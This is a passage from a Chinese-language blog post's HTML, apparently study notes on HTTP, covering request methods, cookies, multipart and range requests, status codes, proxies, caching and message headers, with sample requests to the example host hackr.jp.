class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">www.hackr.jp </span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>响应：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">返回index.html有关的响应首部 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h4 id=\"DELETE\"><a href=\"#DELETE\" class=\"headerlink\" title=\"DELETE\"></a>DELETE</h4><p>DELETE：删除文件<br>DELETE 方法用来删除文件，是与 PUT 相反的方法。DELETE 方法按 请求 URI 删除指定的资源。</p>\n<p>请求：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">DELETE</span> <span class=\"token request-target url\">/example.html</span> <span class=\"token http-version property\">HTTP/1.1</span></span> \n\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">www.hackr.jp </span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>响应：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">响应返回状态码  204 No Content（比如  ：该  html 已从该服务器上删除） <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h4 id=\"OPTIONS\"><a href=\"#OPTIONS\" class=\"headerlink\" title=\"OPTIONS\"></a>OPTIONS</h4><p>OPTIONS：询问支持的方法<br>OPTIONS 方法用来查询针对请求 URI 指定的资源支持的方法。 </p>\n<p>请求：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">OPTIONS * HTTP/1.1 \n\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">www.hackr.jp </span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>响应：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">200</span> <span class=\"token reason-phrase string\">OK </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Allow</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">GET, POST, HEAD, OPTIONS （返回服务器支持的方法） </span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n\n\n\n<h4 id=\"TRACK\"><a href=\"#TRACK\" class=\"headerlink\" title=\"TRACK\"></a>TRACK</h4><p>TRACE：追踪路径<br>TRACE 方法是让  Web 服务器端将之前的请求通信环回给客户端的方 法。<br>发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服 务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最 后接收到请求的服务器端则返回状态码 200 OK 的响应</p>\n<p>请求：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">TRACE</span> <span class=\"token request-target url\">/</span> <span class=\"token http-version property\">HTTP/1.1</span></span> \n\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">hackr.jp </span></span>\n\n<span class=\"token header\"><span class=\"token header-name keyword\">Max-Forwards</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">2 </span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>响应：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">200</span> <span class=\"token reason-phrase string\">OK </span></span>\n\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">message/http </span></span>\n\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1024 </span></span>\n<span class=\"token request-line\"><span class=\"token method property\">TRACE</span> <span class=\"token request-target url\">/</span> <span class=\"token http-version property\">HTTP/1.1</span></span> \n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">hackr.jp </span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Max-Forwards</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">2（返回响应包含请求内容） </span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"CONNECT\"><a href=\"#CONNECT\" class=\"headerlink\" title=\"CONNECT\"></a>CONNECT</h4><p>CONNECT：要求用隧道协议连接代理<br>CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协 议进行 TCP 通信。主要使用 SSL（Secure Sockets Layer，安全套接 层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容 加 密后经网络隧道传输。<br>CONNECT 方法的格式如下所示。 </p>\n<p>CONNECT 代理服务器名:端口号    HTTP版本 </p>\n<p>请求：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">CONNECT proxy.hackr.jp:8080 HTTP/1.1 \n\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">proxy.hackr.jp </span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>响应：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">200</span> <span class=\"token reason-phrase string\">OK（之后进入网络隧道） </span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/bc16fc0bdc1aef2e1d96c95a7305119b.png\"></p>\n<h3 id=\"持久连接\"><a href=\"#持久连接\" class=\"headerlink\" title=\"持久连接\"></a>持久连接</h3><p>持久连接旨在建立 1 次 TCP 连接后进行多次请求和响应的交互</p>\n<h4 id=\"管线化\"><a href=\"#管线化\" class=\"headerlink\" title=\"管线化\"></a>管线化</h4><p>不等待响应，直接发送下一个请求</p>\n<h3 id=\"cookie\"><a href=\"#cookie\" class=\"headerlink\" title=\"cookie\"></a>cookie</h3><p><img src=\"https://images.dadream.eu.org/images/2024/07/be4b0058f89df48262095fa3817ef763.png\"><img src=\"https://images.dadream.eu.org/images/2024/07/bafece7685c6f5723d0be0b8d9900781.png\"></p>\n<p>请求：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/image/</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">hackr.jp</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">sid=1342077140226724</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>响应：</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">200</span> <span class=\"token reason-phrase string\">OK</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Date</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Thu, 12 Jul 2012 07:12:20 GMT</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Server</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Apache</span></span>\n＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,\n10-Oct-12 07:12:20 GMT＞\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/plain; charset=UTF-8</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<hr>\n<h2 id=\"HTTP报文\"><a href=\"#HTTP报文\" class=\"headerlink\" title=\"HTTP报文\"></a>HTTP报文</h2><h3 id=\"结构\"><a href=\"#结构\" class=\"headerlink\" title=\"结构\"></a>结构</h3><p><img src=\"https://images.dadream.eu.org/images/2024/07/3cc4a6cf42aa0161d3b83ff598b01724.png\"><img src=\"https://images.dadream.eu.org/images/2024/07/3ad6ac069f66bb198aba64a2803ea8ad.png\"></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/42f1143b5ce8261c3255e62dd8e28d32.png\"></p>\n<h3 id=\"压缩传输\"><a href=\"#压缩传输\" class=\"headerlink\" title=\"压缩传输\"></a>压缩传输</h3><p>常用的内容编码有以下几种：<br>gzip（GNU zip）<br>compress（UNIX 系统的标准压缩）<br>deflate（zlib）<br>identity（不进行编码）</p>\n<h3 id=\"分割发送的分块传输编码\"><a href=\"#分割发送的分块传输编码\" class=\"headerlink\" title=\"分割发送的分块传输编码\"></a>分割发送的分块传输编码</h3><p>分块传输编码会将实体主体分成多个部分（块）。每一块都会用十六 进制来标记块的大小，而实体主体的最后一块会使用“0(CR+LF)”来标记。<br>使用分块传输编码的实体主体会由接收的客户端负责解码，恢复到编 码前的实体主体。</p>\n<h3 id=\"发送多种数据的多部分对象集合\"><a href=\"#发送多种数据的多部分对象集合\" class=\"headerlink\" title=\"发送多种数据的多部分对象集合\"></a>发送多种数据的多部分对象集合</h3><ul>\n<li><p>multipart/form-data（文件上传时）</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=AaB03x</span></span>\n--AaB03x\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"field1\"</span></span>\nJoe Blow\n--AaB03x\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"pics\"; filename=\"file1.txt\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/plain</span></span>\n<span class=\"token text-plain\">...（file1.txt的数据）...\n--AaB03x--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>multipart/byteranges</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">206</span> <span class=\"token reason-phrase string\">Partial Content</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Date</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Fri, 13 Jul 2012 02:45:26 GMT</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Last-Modified</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Fri, 31 Aug 2007 02:02:20 GMT</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/byteranges; boundary=THIS_STRING_SEPARATES</span></span>\n\n--THIS_STRING_SEPARATES\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/pdf</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Range</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes 500-999/8000</span></span>\n...（范围指定的数据）...\n\n--THIS_STRING_SEPARATES\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/pdf</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Range</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes 7000-7999/8000</span></span>\n...（范围指定的数据）...\n--THIS_STRING_SEPARATES--<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<p>使用 boundary 字符串来划分多部分对象集合指明的各类实体。在boundary 字符串指定的各个实体的起始行之前插入“–”标记（例如：–AaB03x、–THIS_STRING_SEPARATES），而在多部分对象集合对应的字符串的最后插入“–”标记（例如：–AaB03x–、–THIS_STRING_SEPARATES–）作为结束。</p>\n<h3 id=\"获取部分内容的范围请求（分段请求）\"><a href=\"#获取部分内容的范围请求（分段请求）\" class=\"headerlink\" title=\"获取部分内容的范围请求（分段请求）\"></a>获取部分内容的范围请求（分段请求）</h3><p><img src=\"https://images.dadream.eu.org/images/2024/07/702457428b380409f065b3cb6853fd08.png\"></p>\n<p>从一开始到  3000 字节和  5000~7000 字节，8000到之后全部的多重范围</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Range</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes=-3000, 5000-7000 ,8000-</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"内容协商\"><a href=\"#内容协商\" class=\"headerlink\" title=\"内容协商\"></a>内容协商</h3><p>内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然 后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字 符集、编码方式等作为判断的基准。</p>\n<p>参照头</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">Accept \nAccept-Charset\nAccept-Encoding \nAccept-Language \nContent-Language<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>内容协商技术</p>\n<ul>\n<li>服务器驱动协商</li>\n<li>客户端驱动协商</li>\n<li>透明协商</li>\n</ul>\n<h2 id=\"HTTP返回状态码\"><a href=\"#HTTP返回状态码\" class=\"headerlink\" title=\"HTTP返回状态码\"></a>HTTP返回状态码</h2><h3 id=\"类别\"><a href=\"#类别\" class=\"headerlink\" title=\"类别\"></a>类别</h3><p><img src=\"https://images.dadream.eu.org/images/2024/07/448efd6d806b88b6d8ae97140bafec53.png\"></p>\n<h4 id=\"2XX\"><a href=\"#2XX\" class=\"headerlink\" title=\"2XX\"></a>2XX</h4><p>2XX 的响应结果表明请求被正常处理了</p>\n<h5 id=\"200OK\"><a href=\"#200OK\" class=\"headerlink\" title=\"200OK\"></a>200OK</h5><p>表示从客户端发来的请求在服务器端被正常处理了，get请求回返回实体，head请求返回实体首部</p>\n<h5 id=\"204-No-Content\"><a href=\"#204-No-Content\" class=\"headerlink\" title=\"204 No Content\"></a>204 No Content</h5><p>该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。（浏览器不更新页面）</p>\n<h5 id=\"206-Partial-Content\"><a href=\"#206-Partial-Content\" class=\"headerlink\" title=\"206 Partial Content\"></a>206 Partial Content</h5><p>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。</p>\n<h4 id=\"3XX重定向\"><a href=\"#3XX重定向\" class=\"headerlink\" title=\"3XX重定向\"></a>3XX重定向</h4><p>3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p>\n<h5 id=\"301-Moved-Permanently\"><a href=\"#301-Moved-Permanently\" class=\"headerlink\" title=\"301 Moved Permanently\"></a>301 Moved Permanently</h5><p>永久性重定向。该状态码表示请求的资源已被分配了新的 URI，以后应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。</p>\n<h5 id=\"302-Found\"><a href=\"#302-Found\" class=\"headerlink\" title=\"302 Found\"></a>302 Found</h5><p>临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。不更新书签，仍保留产生302的url</p>\n<h5 id=\"303-See-Other\"><a href=\"#303-See-Other\" class=\"headerlink\" title=\"303 See Other\"></a>303 See Other</h5><p>该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET方法定向获取请求的资源。例如，post方法请求时，处理结果希望客服端采用get方法获取资源</p>\n<h5 id=\"304-Not-Modified\"><a href=\"#304-Not-Modified\" class=\"headerlink\" title=\"304 Not Modified\"></a>304 Not Modified</h5><p>该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。</p>\n<p>附带条件的请求是指采用 GET方法的请求报文中包含 If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since 中任一首部。</p>\n<h5 id=\"307-Temporary-Redirect\"><a href=\"#307-Temporary-Redirect\" class=\"headerlink\" title=\"307 Temporary Redirect\"></a>307 Temporary Redirect</h5><h4 id=\"4XX-客户端错误\"><a href=\"#4XX-客户端错误\" class=\"headerlink\" title=\"4XX 客户端错误\"></a>4XX 客户端错误</h4><p>4XX 的响应结果表明客户端是发生错误的原因所在。</p>\n<h5 id=\"400-Bad-Request\"><a href=\"#400-Bad-Request\" class=\"headerlink\" title=\"400 Bad Request\"></a>400 Bad Request</h5><p>该状态码表示请求报文中存在语法错误。修改报文再发送。和200异曲同工</p>\n<h5 id=\"401-Unauthorized\"><a href=\"#401-Unauthorized\" class=\"headerlink\" title=\"401 Unauthorized\"></a>401 Unauthorized</h5><p>该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。</p>\n<p>返回含有 401 的响应必须包含一个适用于被请求资源的 WWW-Authenticate 首部用以质询（challenge）用户信息。</p>\n<p>首次返回一个认证框，再返回就是认证失败</p>\n<h5 id=\"403-Forbidden\"><a href=\"#403-Forbidden\" class=\"headerlink\" title=\"403 Forbidden\"></a>403 Forbidden</h5><p>该状态码表明对请求资源的访问被服务器拒绝了。</p>\n<h5 id=\"404-Not-Found\"><a href=\"#404-Not-Found\" class=\"headerlink\" title=\"404 Not Found\"></a>404 Not Found</h5><p>该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。</p>\n<h4 id=\"5XX-服务器错误\"><a href=\"#5XX-服务器错误\" class=\"headerlink\" title=\"5XX 服务器错误\"></a>5XX 服务器错误</h4><p>5XX 的响应结果表明服务器本身发生错误。</p>\n<h5 id=\"500-Internal-Server-Error\"><a href=\"#500-Internal-Server-Error\" class=\"headerlink\" title=\"500 Internal Server Error\"></a>500 Internal Server Error</h5><p>该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web应用存在的 bug 或某些临时的故障。</p>\n<h5 id=\"503-Service-Unavailable\"><a href=\"#503-Service-Unavailable\" class=\"headerlink\" title=\"503 Service Unavailable\"></a>503 Service Unavailable</h5><p>该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p>\n<h3 id=\"samll-tips\"><a href=\"#samll-tips\" class=\"headerlink\" title=\"samll_tips\"></a>samll_tips</h3><p>不少返回的状态码响应都是错误的，但是用户可能察觉不到这点。</p>\n<h2 id=\"与-HTTP-协作的-Web-服务器\"><a href=\"#与-HTTP-协作的-Web-服务器\" class=\"headerlink\" title=\"与 HTTP 协作的 Web 服务器\"></a>与 HTTP 协作的 Web 服务器</h2><h3 id=\"用单台虚拟主机实现多个域名\"><a href=\"#用单台虚拟主机实现多个域名\" class=\"headerlink\" title=\"用单台虚拟主机实现多个域名\"></a>用单台虚拟主机实现多个域名</h3><p>一台服务器托管了两个域名，<a href=\"http://www.hacker.com,www.hacker2.com,两个域名托管在一个虚拟机,则dns解析后ip相同,两个域名会访问一个ip.在相同的/\">www.hacker.com,www.hacker2.com，两个域名托管在一个虚拟机，则DNS解析后IP相同，两个域名会访问一个IP。在相同的</a> IP 地址下，由于虚拟主机可以寄存多个不同主机名和域名的 Web 网站，因此在发送 HTTP 请求时，必须在 Host 首部内完整指定主机名或域名的 URI。</p>\n<h3 id=\"通信数据转发程序-：代理、网关、隧道\"><a href=\"#通信数据转发程序-：代理、网关、隧道\" class=\"headerlink\" title=\"通信数据转发程序 ：代理、网关、隧道\"></a>通信数据转发程序 ：代理、网关、隧道</h3><h4 id=\"代理\"><a href=\"#代理\" class=\"headerlink\" title=\"代理\"></a>代理</h4><p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。</p>\n<p>代理服务器的基本行为就是接收客户端发送的请求后转发给其他服务器。代理不改变请求 URI，会直接发送给前方持有资源的目标服务器。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/5cb86cda8dff1fbdc1eb32bde62d73c6.png\"></p>\n<p>每次通过代理服务器转发请求或响应时，会追加写入 Via 首部信息</p>\n<h5 id=\"代理方法\"><a href=\"#代理方法\" class=\"headerlink\" title=\"代理方法\"></a>代理方法</h5><p>1.缓存代理</p>\n<p>代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。再次收到相同的资源请求就会返回代理上缓存的资源。</p>\n<p>2.透明代理</p>\n<p>转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。</p>\n<h4 id=\"网关\"><a href=\"#网关\" class=\"headerlink\" title=\"网关\"></a>网关</h4><p>网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关。</p>\n<p>网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非 HTTP 协议服务。<br>利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/1d46d1ae5f16e09805d3e87e506383c5.png\"></p>\n<h4 id=\"隧道\"><a href=\"#隧道\" class=\"headerlink\" title=\"隧道\"></a>隧道</h4><p>隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。</p>\n<p>隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。<br>隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/1abf8e9495373ad8e481c44cd93d8968.png\"></p>\n<h3 id=\"保存资源的缓存\"><a href=\"#保存资源的缓存\" class=\"headerlink\" title=\"保存资源的缓存\"></a>保存资源的缓存</h3><p>缓存服务器的优势在于利用缓存可避免多次从源服务器转发资源。因此客户端可就近从缓存服务器上获取资源，而源服务器也不必多次处理相同的请求了。</p>\n<h4 id=\"缓存的有效期限\"><a href=\"#缓存的有效期限\" class=\"headerlink\" title=\"缓存的有效期限\"></a>缓存的有效期限</h4><p>即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将会再次从源服务器上获取“新”资源。</p>\n<h4 id=\"客户端的缓存\"><a href=\"#客户端的缓存\" class=\"headerlink\" title=\"客户端的缓存\"></a>客户端的缓存</h4><p>缓存不仅可以存在于缓存服务器内，还可以存在客户端浏览器中。以Internet Explorer 程序为例，把客户端缓存称为临时网络文件（Temporary Internet File）。<br>浏览器缓存如果有效，就不必再向服务器请求相同的资源了，可以直接从本地磁盘内读取。</p>\n<h3 id=\"HTTP-出现之前的协议\"><a href=\"#HTTP-出现之前的协议\" class=\"headerlink\" title=\"HTTP 出现之前的协议\"></a>HTTP 出现之前的协议</h3><ol>\n<li>FTP（File Transfer Protocol）<br>传输文件时使用的协议。</li>\n<li>NNTP（Network News Transfer Protocol）<br>用于 NetNews 电子会议室内传送消息的协议。。</li>\n<li>Archie<br>搜索 anonymous FTP 公开的文件信息的协议。</li>\n<li>WAIS（Wide Area Information Servers）<br>以关键词检索多个数据库使用的协议。</li>\n<li>Gopher<br>查找与互联网连接的计算机内信息的协议。</li>\n</ol>\n<h2 id=\"HTTP-首部\"><a href=\"#HTTP-首部\" class=\"headerlink\" title=\"HTTP 首部\"></a>HTTP 首部</h2><h3 id=\"HTTP-报文首部\"><a href=\"#HTTP-报文首部\" class=\"headerlink\" title=\"HTTP 报文首部\"></a>HTTP 报文首部</h3><p><img src=\"https://images.dadream.eu.org/images/2024/07/cdd775e3a5788d5f6b3083052c3eb339.png\"></p>\n<p>HTTP 协议的请求和响应报文中必定包含 HTTP 首部。首部内容为客户端和服务器分别处理请求和响应提供所需要的信息。</p>\n<h4 id=\"HTTP-请求报文\"><a href=\"#HTTP-请求报文\" class=\"headerlink\" title=\"HTTP 请求报文\"></a>HTTP 请求报文</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/34f0690cdfd988547a148806ba15ffb5.png\"></p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">hackr.jp</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,</span></span>\n*/*; q=0.8\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">ja,en-us;q=0.7,en;q=0.3</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">DNT</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">If-Modified-Since</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Fri, 31 Aug 2007 02:02:20 GMT</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">If-None-Match</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">\"45bae1-16a-46d776ac\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"HTTP-响应报文\"><a href=\"#HTTP-响应报文\" class=\"headerlink\" title=\"HTTP 响应报文\"></a>HTTP 响应报文</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/d9a94837fa995200e34533dd7640b88c.png\"></p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">304</span> <span class=\"token reason-phrase string\">Not Modified</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Date</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Thu, 07 Jun 2012 07:21:36 GMT</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Server</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Apache</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Etag</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">\"45bae1-16a-46d776ac\"</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"HTTP-首部字段\"><a href=\"#HTTP-首部字段\" class=\"headerlink\" title=\"HTTP 首部字段\"></a>HTTP 首部字段</h3><h4 id=\"HTTP-首部字段传递重要信息\"><a href=\"#HTTP-首部字段传递重要信息\" class=\"headerlink\" title=\"HTTP 首部字段传递重要信息\"></a>HTTP 首部字段传递重要信息</h4><h4 id=\"HTTP-首部字段结构\"><a href=\"#HTTP-首部字段结构\" class=\"headerlink\" title=\"HTTP 首部字段结构\"></a>HTTP 首部字段结构</h4><p>HTTP 首部字段是由首部字段名和字段值构成的</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">首部字段名: 字段值\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Keep-Alive</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">timeout=15, max=100</span></span><span aria-hidden=\"true\" 